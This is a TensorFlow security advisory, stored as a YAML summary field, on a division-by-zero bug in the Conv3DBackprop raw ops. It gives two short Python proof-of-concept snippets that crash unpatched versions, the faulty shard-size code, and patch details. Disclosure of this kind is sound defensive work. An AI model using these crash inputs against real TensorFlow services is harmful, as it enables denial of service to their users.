summary: "Division by 0 in `Conv3DBackprop*`\n### Impact\nThe `tf.raw_ops.Conv3DBackprop*` operations\
  \ fail to validate that the input tensors are not empty. In turn, this would result in a division\
  \ by 0:\n\n```python\nimport tensorflow as tf\n\ninput_sizes = tf.constant([0, 0, 0, 0, 0],\
  \ shape=[5], dtype=tf.int32)\nfilter_tensor = tf.constant([], shape=[0, 0, 0, 1, 0], dtype=tf.float32)\n\
  out_backprop = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\n                \
  \            \ntf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor,\
  \ out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding='SAME', data_format='NDHWC',\
  \ dilations=[1, 1, 1, 1, 1])\n```\n```python\nimport tensorflow as tf\n\ninput_sizes = tf.constant([1],\
  \ shape=[1, 1, 1, 1, 1], dtype=tf.float32)\nfilter_tensor = tf.constant([0, 0, 0, 1, 0], shape=[5],\
  \ dtype=tf.int32)\nout_backprop = tf.constant([], shape=[1, 1, 1, 1, 0], dtype=tf.float32)\n\
  \ntf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop,\
  \ strides=[1, 1, 1, 1, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])\n\
  ```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/a91bb59769f19146d5a0c20060244378e878f140/tensorflow/core/kernels/conv_grad_ops_3d.cc#L430-L450)\
  \ does not check that the divisor used in computing the shard size is not zero:\n\n```cc\n\
  \  const int64 size_A = output_image_size * dims.out_depth;\n  const int64 size_B = filter_total_size\
  \ * dims.out_depth;\n  const int64 size_C = output_image_size * filter_total_size;\n  const\
  \ int64 work_unit_size = size_A + size_B + size_C;\n  ...\n  const size_t shard_size =\n \
  \     use_parallel_contraction\n        ? 1\n        : (target_working_set_size + work_unit_size\
  \ - 1) / work_unit_size;\n```\n\nThus, if attacker controls the input sizes, they can trigger\
  \ a denial of service via a division by zero error.\n\n### Patches\nWe have patched the issue\
  \ in GitHub commit [311403edbc9816df80274bd1ea8b3c0c0f22c3fa](https://github.com/tensorflow/tensorflow/commit/311403edbc9816df80274bd1ea8b3c0c0f22c3fa).\n\
  \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow\
  \ 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected\
  \ and still in supported range.\n\n### For more information\nPlease consult [our security\
  \ guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information\
  \ regarding the security model and how to contact us with issues and questions.\n\n### Attribution\n\
  This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
